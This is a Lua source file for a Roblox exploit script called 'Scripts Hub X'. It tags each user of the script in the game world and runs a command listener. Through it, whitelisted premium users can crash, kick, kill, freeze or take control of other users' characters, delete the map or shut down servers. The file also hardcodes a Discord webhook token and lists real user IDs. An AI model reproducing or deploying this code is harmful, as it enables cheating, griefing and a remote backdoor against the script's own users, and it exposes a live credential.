-- ================================
-- Scripts Hub X | Official (Fixed Version) + Premium Commands System + Control Feature
-- ================================

-- KEY SYSTEM TOGGLE VARIABLE
local Keysystem = false -- Set to false to skip key system for non-premium users

-- Services
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local SoundService = game:GetService("SoundService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local MarketplaceService = game:GetService("MarketplaceService")
local TeleportService = game:GetService("TeleportService")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local Lighting = game:GetService("Lighting")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui", 5)

-- UserIds
local OwnerUserId = "2341777244"
local PremiumUsers = {
	"1102633570", -- Pedrojay450 [PERM]
	"8860068952", -- Pedrojay450's alt (assaltanoobsbr) [PERM]
	"799427028", -- Roblox_xvt [PERM]
	"5317421108", -- kolwneje [PERM]
	"1458719572", -- wxckfeen [PERM]
	"8931026465", -- genderwillnottell [PERM]
	"679713988" -- LautyyPc [PERM]
}

local StaffUserId = {
	"3882788546", -- Keanjacob5
	"799427028", -- Roblox_xvt
	"9249886989", -- ALT
	"2726723958" -- mhicel235TOH
}

local BlacklistUsers = {
	"716599904", -- ImRottingInHell [PERM]
	"229691" -- ravyn [PERM]
}

-- Webhook URLs
local webhookUrl = "https://discord.com/api/webhooks/1416367485803827230/4OLebMf0rtkCajS5S5lmo99iXe0v6v5B1gn_lPDAzz_MQtj0-HabA9wa2PF-5QBNUmgi"

-- ================================
-- SCRIPTS HUB X USER TRACKING SYSTEM
-- ================================

local SCRIPTSHUBX_MARKER_NAME = "SHX_USER_MARKER"
local COMMAND_FOLDER_NAME = "SHX_COMMANDS"
local commandFolder = nil
local userMarker = nil
local trackedUsers = {}
local isPremiumUser = false
local helpGui = nil

-- Control system variables
local isBeingControlled = false
local controllerUserId = nil
local isControlling = false
local controlTargetUserId = nil
local controlConnection = nil
local movementConnections = {}

-- Create user marker to identify Scripts Hub X users
local function createUserMarker()
	pcall(function()
		-- Check if marker already exists
		if Workspace:FindFirstChild(SCRIPTSHUBX_MARKER_NAME .. "_" .. player.UserId) then
			return
		end
		
		-- Create invisible marker
		local marker = Instance.new("Part")
		marker.Name = SCRIPTSHUBX_MARKER_NAME .. "_" .. player.UserId
		marker.Size = Vector3.new(0.1, 0.1, 0.1)
		marker.Transparency = 1
		marker.CanCollide = false
		marker.Anchored = true
		marker.Position = Vector3.new(0, -10000, 0) -- Far away
		
		-- Store user info
		local userInfo = Instance.new("StringValue")
		userInfo.Name = "UserInfo"
		userInfo.Value = HttpService:JSONEncode({
			UserId = player.UserId,
			Username = player.Name,
			DisplayName = player.DisplayName,
			IsPremium = isPremiumUser,
			Timestamp = tick()
		})
		userInfo.Parent = marker
		
		marker.Parent = Workspace
		userMarker = marker
		
		print("[SHX] User marker created")
	end)
end

-- Create command folder for inter-user communication
local function createCommandFolder()
	pcall(function()
		if Workspace:FindFirstChild(COMMAND_FOLDER_NAME) then
			commandFolder = Workspace[COMMAND_FOLDER_NAME]
		else
			commandFolder = Instance.new("Folder")
			commandFolder.Name = COMMAND_FOLDER_NAME
			commandFolder.Parent = Workspace
		end
		print("[SHX] Command folder initialized")
	end)
end

-- Scan for other Scripts Hub X users
local function scanForScriptsHubXUsers()
	pcall(function()
		trackedUsers = {}
		for _, obj in pairs(Workspace:GetChildren()) do
			if obj.Name:match("^" .. SCRIPTSHUBX_MARKER_NAME .. "_") then
				local userId = obj.Name:gsub(SCRIPTSHUBX_MARKER_NAME .. "_", "")
				if userId ~= tostring(player.UserId) then
					local userInfo = obj:FindFirstChild("UserInfo")
					if userInfo and userInfo:IsA("StringValue") then
						local success, data = pcall(function()
							return HttpService:JSONDecode(userInfo.Value)
						end)
						if success and data then
							trackedUsers[userId] = {
								Username = data.Username,
								DisplayName = data.DisplayName,
								IsPremium = data.IsPremium,
								Marker = obj
							}
						end
					end
				end
			end
		end
		print("[SHX] Found " .. #trackedUsers .. " Scripts Hub X users")
	end)
end

-- ================================
-- HELP GUI SYSTEM
-- ================================

local commandsList = {
	{cmd = ";help", desc = "Shows this help menu", example = ";help", category = "Info"},
	{cmd = ";control [user]", desc = "Take control of target player's character", example = ";control username", category = "Control"},
	{cmd = ";uncontrol", desc = "Stop controlling the target player", example = ";uncontrol", category = "Control"},
	{cmd = ";kick [user]", desc = "Kicks you or target user from the game", example = ";kick OR ;kick username", category = "Player"},
	{cmd = ";kill [user]", desc = "Kills you or target user", example = ";kill OR ;kill username", category = "Player"},
	{cmd = ";jump [user]", desc = "Makes you or target user jump", example = ";jump OR ;jump username", category = "Player"},
	{cmd = ";trip [user]", desc = "Makes you or target user trip/sit", example = ";trip OR ;trip username", category = "Player"},
	{cmd = ";void [user]", desc = "Sends you or target user to the void", example = ";void OR ;void username", category = "Player"},
	{cmd = ";freeze [user]", desc = "Freezes you or target user in place", example = ";freeze OR ;freeze username", category = "Player"},
	{cmd = ";funny [user]", desc = "Sends you or target user to space", example = ";funny OR ;funny username", category = "Player"},
	{cmd = ";crash [user]", desc = "Crashes your or target user's game", example = ";crash OR ;crash username", category = "Destructive"},
	{cmd = ";byfron [user]", desc = "Deletes all GUIs for you or target user", example = ";byfron OR ;byfron username", category = "Destructive"},
	{cmd = ";uninject [user]", desc = "Removes Scripts Hub X from you or target", example = ";uninject OR ;uninject username", category = "Utility"},
	{cmd = ";reveal", desc = "Announces in chat that you're using SHX", example = ";reveal", category = "Fun"},
	{cmd = ";shutdown", desc = "Shuts down the entire server", example = ";shutdown", category = "Server"},
	{cmd = ";deletemap", desc = "Deletes all objects in workspace", example = ";deletemap", category = "Server"},
	{cmd = ";gravity [value]", desc = "Changes workspace gravity", example = ";gravity 50", category = "Server"},
	{cmd = ";framerate [fps]", desc = "Sets your FPS cap", example = ";framerate 30", category = "Client"},
	{cmd = ";toggle", desc = "Toggles all your ScreenGuis", example = ";toggle", category = "Client"},
	{cmd = ";india", desc = "Changes skybox to India theme", example = ";india", category = "Visual"},
	{cmd = ";scriptshubx", desc = "Changes skybox to SHX theme", example = ";scriptshubx", category = "Visual"},
	{cmd = ";anime", desc = "Changes skybox to Anime theme", example = ";anime", category = "Visual"},
}

local function createHelpGui()
	if helpGui then
		helpGui:Destroy()
	end
	
	-- Create ScreenGui
	helpGui = Instance.new("ScreenGui")
	helpGui.Name = "SHXHelpGui"
	helpGui.ResetOnSpawn = false
	helpGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	
	-- Main Frame
	local mainFrame = Instance.new("Frame")
	mainFrame.Name = "MainFrame"
	mainFrame.Size = UDim2.new(0, 400, 0, 500)
	mainFrame.Position = UDim2.new(0.5, -200, 0.5, -250)
	mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
	mainFrame.BorderSizePixel = 0
	mainFrame.Parent = helpGui
	
	-- Add rounded corners
	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 12)
	corner.Parent = mainFrame
	
	-- Add shadow effect
	local shadow = Instance.new("ImageLabel")
	shadow.Name = "Shadow"
	shadow.BackgroundTransparency = 1
	shadow.Position = UDim2.new(0, -15, 0, -15)
	shadow.Size = UDim2.new(1, 30, 1, 30)
	shadow.ZIndex = 0
	shadow.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
	shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
	shadow.ImageTransparency = 0.5
	shadow.ScaleType = Enum.ScaleType.Slice
	shadow.SliceCenter = Rect.new(10, 10, 10, 10)
	shadow.Parent = mainFrame
	
	-- Header
	local header = Instance.new("Frame")
	header.Name = "Header"
	header.Size = UDim2.new(1, 0, 0, 50)
	header.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
	header.BorderSizePixel = 0
	header.Parent = mainFrame
	
	local headerCorner = Instance.new("UICorner")
	headerCorner.CornerRadius = UDim.new(0, 12)
	headerCorner.Parent = header
	
	-- Title
	local title = Instance.new("TextLabel")
	title.Name = "Title"
	title.Size = UDim2.new(1, -60, 1, 0)
	title.Position = UDim2.new(0, 15, 0, 0)
	title.BackgroundTransparency = 1
	title.Text = "Scripts Hub X - Premium Commands"
	title.TextColor3 = Color3.fromRGB(255, 255, 255)
	title.TextSize = 18
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.Font = Enum.Font.GothamBold
	title.Parent = header
	
	-- Close Button
	local closeButton = Instance.new("TextButton")
	closeButton.Name = "CloseButton"
	closeButton.Size = UDim2.new(0, 40, 0, 40)
	closeButton.Position = UDim2.new(1, -45, 0, 5)
	closeButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
	closeButton.Text = "×"
	closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	closeButton.TextSize = 24
	closeButton.Font = Enum.Font.GothamBold
	closeButton.BorderSizePixel = 0
	closeButton.Parent = header
	
	local closeCorner = Instance.new("UICorner")
	closeCorner.CornerRadius = UDim.new(0, 8)
	closeCorner.Parent = closeButton
	
	-- Close button hover effect
	closeButton.MouseEnter:Connect(function()
		TweenService:Create(closeButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(220, 70, 70)}):Play()
	end)
	
	closeButton.MouseLeave:Connect(function()
		TweenService:Create(closeButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(200, 50, 50)}):Play()
	end)
	
	closeButton.MouseButton1Click:Connect(function()
		helpGui:Destroy()
		helpGui = nil
	end)
	
	-- Info Label
	local infoLabel = Instance.new("TextLabel")
	infoLabel.Name = "InfoLabel"
	infoLabel.Size = UDim2.new(1, -30, 0, 40)
	infoLabel.Position = UDim2.new(0, 15, 0, 55)
	infoLabel.BackgroundTransparency = 1
	infoLabel.Text = "Commands work on yourself if no target specified.\nSupports both Username and Display Name."
	infoLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
	infoLabel.TextSize = 12
	infoLabel.TextWrapped = true
	infoLabel.TextXAlignment = Enum.TextXAlignment.Left
	infoLabel.TextYAlignment = Enum.TextYAlignment.Top
	infoLabel.Font = Enum.Font.Gotham
	infoLabel.Parent = mainFrame
	
	-- Scrolling Frame
	local scrollFrame = Instance.new("ScrollingFrame")
	scrollFrame.Name = "ScrollFrame"
	scrollFrame.Size = UDim2.new(1, -20, 1, -110)
	scrollFrame.Position = UDim2.new(0, 10, 0, 100)
	scrollFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
	scrollFrame.BorderSizePixel = 0
	scrollFrame.ScrollBarThickness = 6
	scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 120)
	scrollFrame.Parent = mainFrame
	
	local scrollCorner = Instance.new("UICorner")
	scrollCorner.CornerRadius = UDim.new(0, 8)
	scrollCorner.Parent = scrollFrame
	
	-- Layout for commands
	local layout = Instance.new("UIListLayout")
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Padding = UDim.new(0, 8)
	layout.Parent = scrollFrame
	
	local padding = Instance.new("UIPadding")
	padding.PaddingTop = UDim.new(0, 8)
	padding.PaddingBottom = UDim.new(0, 8)
	padding.PaddingLeft = UDim.new(0, 8)
	padding.PaddingRight = UDim.new(0, 8)
	padding.Parent = scrollFrame
	
	-- Add command entries
	local currentCategory = ""
	for _, cmdData in ipairs(commandsList) do
		-- Category header
		if cmdData.category ~= currentCategory then
			currentCategory = cmdData.category
			local categoryLabel = Instance.new("TextLabel")
			categoryLabel.Name = "Category_" .. currentCategory
			categoryLabel.Size = UDim2.new(1, -16, 0, 25)
			categoryLabel.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
			categoryLabel.BorderSizePixel = 0
			categoryLabel.Text = "  " .. currentCategory
			categoryLabel.TextColor3 = Color3.fromRGB(100, 200, 255)
			categoryLabel.TextSize = 14
			categoryLabel.Font = Enum.Font.GothamBold
			categoryLabel.TextXAlignment = Enum.TextXAlignment.Left
			categoryLabel.Parent = scrollFrame
			
			local catCorner = Instance.new("UICorner")
			catCorner.CornerRadius = UDim.new(0, 6)
			catCorner.Parent = categoryLabel
		end
		
		-- Command frame
		local cmdFrame = Instance.new("Frame")
		cmdFrame.Name = "Cmd_" .. cmdData.cmd
		cmdFrame.Size = UDim2.new(1, -16, 0, 70)
		cmdFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
		cmdFrame.BorderSizePixel = 0
		cmdFrame.Parent = scrollFrame
		
		local cmdCorner = Instance.new("UICorner")
		cmdCorner.CornerRadius = UDim.new(0, 6)
		cmdCorner.Parent = cmdFrame
		
		-- Command name
		local cmdName = Instance.new("TextLabel")
		cmdName.Name = "CmdName"
		cmdName.Size = UDim2.new(1, -10, 0, 20)
		cmdName.Position = UDim2.new(0, 5, 0, 5)
		cmdName.BackgroundTransparency = 1
		cmdName.Text = cmdData.cmd
		cmdName.TextColor3 = Color3.fromRGB(100, 255, 150)
		cmdName.TextSize = 13
		cmdName.Font = Enum.Font.GothamBold
		cmdName.TextXAlignment = Enum.TextXAlignment.Left
		cmdName.Parent = cmdFrame
		
		-- Description
		local cmdDesc = Instance.new("TextLabel")
		cmdDesc.Name = "CmdDesc"
		cmdDesc.Size = UDim2.new(1, -10, 0, 20)
		cmdDesc.Position = UDim2.new(0, 5, 0, 25)
		cmdDesc.BackgroundTransparency = 1
		cmdDesc.Text = cmdData.desc
		cmdDesc.TextColor3 = Color3.fromRGB(200, 200, 200)
		cmdDesc.TextSize = 11
		cmdDesc.Font = Enum.Font.Gotham
		cmdDesc.TextXAlignment = Enum.TextXAlignment.Left
		cmdDesc.TextWrapped = true
		cmdDesc.Parent = cmdFrame
		
		-- Example (FIXED: Changed from GothamItalic to Gotham)
		local cmdExample = Instance.new("TextLabel")
		cmdExample.Name = "CmdExample"
		cmdExample.Size = UDim2.new(1, -10, 0, 20)
		cmdExample.Position = UDim2.new(0, 5, 0, 47)
		cmdExample.BackgroundTransparency = 1
		cmdExample.Text = "Example: " .. cmdData.example
		cmdExample.TextColor3 = Color3.fromRGB(150, 150, 170)
		cmdExample.TextSize = 10
		cmdExample.Font = Enum.Font.Gotham  -- FIXED: Was Enum.Font.GothamItalic
		cmdExample.TextXAlignment = Enum.TextXAlignment.Left
		cmdExample.Parent = cmdFrame
	end
	
	-- Update canvas size
	scrollFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 16)
	layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
		scrollFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 16)
	end)
	
	-- Make draggable
	local dragging, dragInput, dragStart, startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	header.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = mainFrame.Position
			
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	header.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	game:GetService("UserInputService").InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
	
	helpGui.Parent = CoreGui
	
	-- Animate entrance
	mainFrame.Position = UDim2.new(0.5, -200, -0.5, 0)
	TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
		Position = UDim2.new(0.5, -200, 0.5, -250)
	}):Play()
end

-- ================================
-- CONTROL SYSTEM FUNCTIONS
-- ================================

-- Send control command to target
local function sendControlCommand(targetUserId, commandType, data)
	pcall(function()
		local commandObj = Instance.new("StringValue")
		commandObj.Name = "CTRL_" .. HttpService:GenerateGUID(false)
		commandObj.Value = HttpService:JSONEncode({
			Command = "controldata",
			Type = commandType,
			Data = data,
			SenderUserId = tostring(player.UserId),
			TargetUserId = targetUserId,
			Timestamp = tick()
		})
		commandObj.Parent = commandFolder
		
		-- Clean up quickly
		task.delay(0.5, function()
			if commandObj and commandObj.Parent then
				commandObj:Destroy()
			end
		end)
	end)
end

-- Apply control movement (for target player)
local function applyControlMovement(data)
	if not player.Character then return end
	local humanoid = player.Character:FindFirstChild("Humanoid")
	local hrp = player.Character:FindFirstChild("HumanoidRootPart")
	if not humanoid or not hrp then return end
	
	if data.Action == "move" then
		-- Apply movement direction
		humanoid:Move(Vector3.new(data.X or 0, 0, data.Z or 0), false)
	elseif data.Action == "jump" then
		humanoid.Jump = true
	elseif data.Action == "sit" then
		humanoid.Sit = data.Value
	end
end

-- Start controlling target
local function startControlling(targetUserId, targetUsername)
	if isControlling then
		print("[SHX] Already controlling someone. Use ;uncontrol first.")
		return false
	end
	
	isControlling = true
	controlTargetUserId = targetUserId
	
	print("[SHX] Now controlling: " .. targetUsername)
	notify("Scripts Hub X", "Controlling " .. targetUsername .. " - Use ;uncontrol to stop")
	
	-- Send initial control command
	sendControlCommand(targetUserId, "start", {
		ControllerUsername = player.Name
	})
	
	-- Set up input capture
	local keysPressed = {}
	
	-- Input began
	movementConnections.inputBegan = UserInputService.InputBegan:Connect(function(input, gameProcessed)
		if gameProcessed then return end
		
		if input.KeyCode == Enum.KeyCode.W then
			keysPressed.W = true
		elseif input.KeyCode == Enum.KeyCode.A then
			keysPressed.A = true
		elseif input.KeyCode == Enum.KeyCode.S then
			keysPressed.S = true
		elseif input.KeyCode == Enum.KeyCode.D then
			keysPressed.D = true
		elseif input.KeyCode == Enum.KeyCode.Space then
			sendControlCommand(controlTargetUserId, "input", {
				Action = "jump"
			})
		elseif input.KeyCode == Enum.KeyCode.C then
			sendControlCommand(controlTargetUserId, "input", {
				Action = "sit",
				Value = true
			})
		end
	end)
	
	-- Input ended
	movementConnections.inputEnded = UserInputService.InputEnded:Connect(function(input, gameProcessed)
		if input.KeyCode == Enum.KeyCode.W then
			keysPressed.W = false
		elseif input.KeyCode == Enum.KeyCode.A then
			keysPressed.A = false
		elseif input.KeyCode == Enum.KeyCode.S then
			keysPressed.S = false
		elseif input.KeyCode == Enum.KeyCode.D then
			keysPressed.D = false
		end
	end)
	
	-- Continuous movement update
	movementConnections.renderStep = RunService.RenderStepped:Connect(function()
		if not isControlling then return end
		
		local moveX = 0
		local moveZ = 0
		
		if keysPressed.W then moveZ = moveZ - 1 end
		if keysPressed.S then moveZ = moveZ + 1 end
		if keysPressed.A then moveX = moveX - 1 end
		if keysPressed.D then moveX = moveX + 1 end
		
		-- Normalize diagonal movement
		if moveX ~= 0 and moveZ ~= 0 then
			local length = math.sqrt(moveX * moveX + moveZ * moveZ)
			moveX = moveX / length
			moveZ = moveZ / length
		end
		
		if moveX ~= 0 or moveZ ~= 0 then
			sendControlCommand(controlTargetUserId, "input", {
				Action = "move",
				X = moveX,
				Z = moveZ
			})
		end
	end)
	
	return true
end

-- Stop controlling
local function stopControlling()
	if not isControlling then
		print("[SHX] Not currently controlling anyone")
		return
	end
	
	-- Send stop command
	if controlTargetUserId then
		sendControlCommand(controlTargetUserId, "stop", {})
	end
	
	-- Clean up connections
	for _, connection in pairs(movementConnections) do
		if connection then
			connection:Disconnect()
		end
	end
	movementConnections = {}
	
	print("[SHX] Stopped controlling")
	notify("Scripts Hub X", "Control session ended")
	
	isControlling = false
	controlTargetUserId = nil
end

-- Handle being controlled (target side)
local function handleControlStart(controllerUsername)
	if isBeingControlled then
		print("[SHX] Already being controlled")
		return
	end
	
	isBeingControlled = true
	controllerUserId = controllerUsername
	
	print("[SHX] Now being controlled by: " .. controllerUsername)
	notify("Scripts Hub X", "Being controlled by " .. controllerUsername)
	
	-- Disable player's own input
	pcall(function()
		if player.Character and player.Character:FindFirstChild("Humanoid") then
			player.Character.Humanoid.WalkSpeed = 16 -- Maintain normal speed
		end
	end)
end

-- Handle control end (target side)
local function handleControlStop()
	isBeingControlled = false
	controllerUserId = nil
	
	print("[SHX] Control session ended")
	notify("Scripts Hub X", "No longer being controlled")
end

-- ================================
-- PREMIUM COMMAND FUNCTIONS
-- ================================

local CommandFunctions = {}

-- ;help command
CommandFunctions.help = function(args)
	createHelpGui()
end

-- ;control command
CommandFunctions.control = function(args, targetSelf)
	local targetUsername = args[2]
	
	if not targetUsername then
		print("[SHX] Please specify a target: ;control <username>")
		return
	end
	
	-- Find target user
	local targetUserId = nil
	local targetUserData = nil
	for userId, userData in pairs(trackedUsers) do
		if userData.Username:lower() == targetUsername:lower() or userData.DisplayName:lower() == targetUsername:lower() then
			targetUserId = userId
			targetUserData = userData
			break
		end
	end
	
	if not targetUserId then
		print("[SHX] Target user '" .. targetUsername .. "' not found or not using Scripts Hub X")
		return
	end
	
	startControlling(targetUserId, targetUserData.Username)
end

-- ;uncontrol command
CommandFunctions.uncontrol = function(args, targetSelf)
	stopControlling()
end

-- ;kick command
CommandFunctions.kick = function(args, targetSelf)
	local message = table.concat(args, " ", 2) or "You have been kicked by a Scripts Hub X Premium user"
	player:Kick(message)
end

-- ;crash command
CommandFunctions.crash = function(args, targetSelf)
	while true do
		RunService.Heartbeat:Wait()
		for i = 1, 1000 do
			Instance.new("Part", Workspace)
		end
	end
end

-- ;byfron command (delete all GUIs)
CommandFunctions.byfron = function(args, targetSelf)
	pcall(function()
		for _, gui in pairs(playerGui:GetDescendants()) do
			if gui:IsA("GuiObject") then
				gui:Destroy()
			end
		end
		for _, gui in pairs(CoreGui:GetDescendants()) do
			if gui:IsA("GuiObject") then
				pcall(function() gui:Destroy() end)
			end
		end
	end)
end

-- ;deletemap command
CommandFunctions.deletemap = function(args, targetSelf)
	pcall(function()
		for _, obj in pairs(Workspace:GetChildren()) do
			if obj ~= Workspace.CurrentCamera and obj.Name ~= COMMAND_FOLDER_NAME and not obj.Name:match(SCRIPTSHUBX_MARKER_NAME) then
				pcall(function() obj:Destroy() end)
			end
		end
	end)
end

-- ;framerate command
CommandFunctions.framerate = function(args, targetSelf)
	local fps = tonumber(args[2]) or 1
	pcall(function()
		setfpscap(fps)
	end)
	if not pcall(function() setfpscap(fps) end) then
		-- Alternative framerate method
		RunService:Set3dRenderingEnabled(false)
		task.wait(0.1)
		RunService:Set3dRenderingEnabled(true)
	end
end

-- ;gravity command
CommandFunctions.gravity = function(args, targetSelf)
	local gravityValue = tonumber(args[2]) or 100
	Workspace.Gravity = gravityValue
end

-- ;jump command
CommandFunctions.jump = function(args, targetSelf)
	if player.Character and player.Character:FindFirstChild("Humanoid") then
		player.Character.Humanoid.Jump = true
	end
end

-- ;kill command
CommandFunctions.kill = function(args, targetSelf)
	if player.Character and player.Character:FindFirstChild("Humanoid") then
		player.Character.Humanoid.Health = 0
	end
end

-- ;reveal command
CommandFunctions.reveal = function(args, targetSelf)
	pcall(function()
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
			"I am using Scripts Hub X :)",
			"All"
		)
	end)
end

-- ;shutdown command
CommandFunctions.shutdown = function(args, targetSelf)
	game:Shutdown()
end

-- ;toggle command
CommandFunctions.toggle = function(args, targetSelf)
	pcall(function()
		for _, gui in pairs(playerGui:GetDescendants()) do
			if gui:IsA("ScreenGui") then
				gui.Enabled = not gui.Enabled
			end
		end
	end)
end

-- ;trip command
CommandFunctions.trip = function(args, targetSelf)
	if player.Character and player.Character:FindFirstChild("Humanoid") then
		player.Character.Humanoid.Sit = true
	end
end

-- ;uninject command
CommandFunctions.uninject = function(args, targetSelf)
	pcall(function()
		if userMarker then userMarker:Destroy() end
		if helpGui then helpGui:Destroy() end
		for _, gui in pairs(playerGui:GetChildren()) do
			if gui.Name:match("SHX") or gui.Name:match("ScriptsHubX") then
				gui:Destroy()
			end
		end
	end)
end

-- ;void command
CommandFunctions.void = function(args, targetSelf)
	if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
		player.Character.HumanoidRootPart.CFrame = CFrame.new(0, -500, 0)
	end
end

-- ;india, ;scriptshubx, ;anime commands
CommandFunctions.india = function(args, targetSelf)
	pcall(function()
		local sky = Instance.new("Sky", Lighting)
		sky.SkyboxBk = "rbxassetid://6534369609"
		sky.SkyboxDn = "rbxassetid://6534369609"
		sky.SkyboxFt = "rbxassetid://6534369609"
		sky.SkyboxLf = "rbxassetid://6534369609"
		sky.SkyboxRt = "rbxassetid://6534369609"
		sky.SkyboxUp = "rbxassetid://6534369609"
	end)
end

CommandFunctions.scriptshubx = function(args, targetSelf)
	pcall(function()
		local sky = Instance.new("Sky", Lighting)
		sky.SkyboxBk = "rbxassetid://74135635728836"
		sky.SkyboxDn = "rbxassetid://74135635728836"
		sky.SkyboxFt = "rbxassetid://74135635728836"
		sky.SkyboxLf = "rbxassetid://74135635728836"
		sky.SkyboxRt = "rbxassetid://74135635728836"
		sky.SkyboxUp = "rbxassetid://74135635728836"
	end)
end

CommandFunctions.anime = function(args, targetSelf)
	pcall(function()
		local sky = Instance.new("Sky", Lighting)
		sky.SkyboxBk = "rbxassetid://8281674209"
		sky.SkyboxDn = "rbxassetid://8281674209"
		sky.SkyboxFt = "rbxassetid://8281674209"
		sky.SkyboxLf = "rbxassetid://8281674209"
		sky.SkyboxRt = "rbxassetid://8281674209"
		sky.SkyboxUp = "rbxassetid://8281674209"
	end)
end

-- ;freeze command
CommandFunctions.freeze = function(args, targetSelf)
	if player.Character then
		for _, part in pairs(player.Character:GetDescendants()) do
			if part:IsA("BasePart") then
				part.Anchored = true
			end
		end
	end
end

-- ;funny command
CommandFunctions.funny = function(args, targetSelf)
	if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
		player.Character.HumanoidRootPart.CFrame = CFrame.new(0, 100000, 0)
	end
end

-- ================================
-- COMMAND LISTENER AND EXECUTOR
-- ================================

-- Commands that don't require a target (affect self or environment)
local selfOnlyCommands = {
	"help", "reveal", "shutdown", "deletemap", "toggle", 
	"india", "scriptshubx", "anime", "gravity", "framerate", "uncontrol"
}

-- Listen for command objects in workspace
local function startCommandListener()
	if not commandFolder then return end
	
	commandFolder.ChildAdded:Connect(function(obj)
		task.wait(0.1)
		
		-- Handle control commands
		if obj:IsA("StringValue") and obj.Name:match("^CTRL_") then
			pcall(function()
				local commandData = HttpService:JSONDecode(obj.Value)
				
				-- Check if command is for this user
				if commandData.TargetUserId == tostring(player.UserId) then
					if commandData.Type == "start" then
						handleControlStart(commandData.Data.ControllerUsername)
					elseif commandData.Type == "stop" then
						handleControlStop()
					elseif commandData.Type == "input" then
						if isBeingControlled then
							applyControlMovement(commandData.Data)
						end
					end
					
					-- Quick cleanup for control commands
					task.wait(0.1)
					obj:Destroy()
				end
			end)
		end
		
		-- Handle regular commands
		if obj:IsA("StringValue") and obj.Name:match("^CMD_") then
			pcall(function()
				local commandData = HttpService:JSONDecode(obj.Value)
				
				-- Check if command is for this user
				if commandData.TargetUserId == tostring(player.UserId) then
					print("[SHX] Received command: " .. commandData.Command .. " from " .. commandData.SenderUsername)
					
					-- Execute the command
					local commandName = commandData.Command:lower()
					local args = commandData.Args or {}
					
					if CommandFunctions[commandName] then
						task.spawn(function()
							CommandFunctions[commandName](args, false)
						end)
					end
					
					-- Clean up command object
					task.wait(1)
					obj:Destroy()
				end
			end)
		end
	end)
	
	print("[SHX] Command listener started")
end

-- Parse and send commands from chat
local function parseCommand(message)
	if not message:sub(1, 1) == ";" then return end
	if not isPremiumUser then
		print("[SHX] You need premium to use commands")
		return
	end
	
	local args = {}
	for word in message:gmatch("%S+") do
		table.insert(args, word)
	end
	
	local command = args[1]:sub(2):lower() -- Remove semicolon
	
	-- Check if command exists
	if not CommandFunctions[command] then
		print("[SHX] Unknown command: " .. command)
		return
	end
	
	-- Special handling for self-only commands
	if table.find(selfOnlyCommands, command) then
		print("[SHX] Executing self-command: " .. command)
		task.spawn(function()
			CommandFunctions[command](args, true)
		end)
		return
	end
	
	-- Check if target is specified
	local targetUsername = args[2]
	
	-- If no target specified, execute on self
	if not targetUsername then
		print("[SHX] No target specified, executing on self: " .. command)
		task.spawn(function()
			CommandFunctions[command](args, true)
		end)
		return
	end
	
	-- Find target user in tracked users (supports both username and display name)
	local targetUserId = nil
	local targetUserData = nil
	for userId, userData in pairs(trackedUsers) do
		if userData.Username:lower() == targetUsername:lower() or userData.DisplayName:lower() == targetUsername:lower() then
			targetUserId = userId
			targetUserData = userData
			break
		end
	end
	
	if not targetUserId then
		print("[SHX] Target user '" .. targetUsername .. "' not found or not using Scripts Hub X")
		return
	end
	
	-- Create command object for target user
	pcall(function()
		local commandObj = Instance.new("StringValue")
		commandObj.Name = "CMD_" .. HttpService:GenerateGUID(false)
		commandObj.Value = HttpService:JSONEncode({
			Command = command,
			Args = args,
			SenderUserId = tostring(player.UserId),
			SenderUsername = player.Name,
			TargetUserId = targetUserId,
			Timestamp = tick()
		})
		commandObj.Parent = commandFolder
		
		print("[SHX] Command sent: " .. command .. " to " .. targetUserData.Username)
		
		-- Clean up after 5 seconds
		task.delay(5, function()
			if commandObj and commandObj.Parent then
				commandObj:Destroy()
			end
		end)
	end)
end

-- Listen to player's chat
local function startChatListener()
	-- Method 1: TextChatService (new chat)
	pcall(function()
		local TextChatService = game:GetService("TextChatService")
		local textChannel = TextChatService.TextChannels.RBXGeneral
		
		textChannel.MessageReceived:Connect(function(message)
			if message.TextSource and message.TextSource.UserId == player.UserId then
				parseCommand(message.Text)
			end
		end)
	end)
	
	-- Method 2: Legacy chat
	pcall(function()
		player.Chatted:Connect(function(message)
			parseCommand(message)
		end)
	end)
	
	print("[SHX] Chat listener started")
end

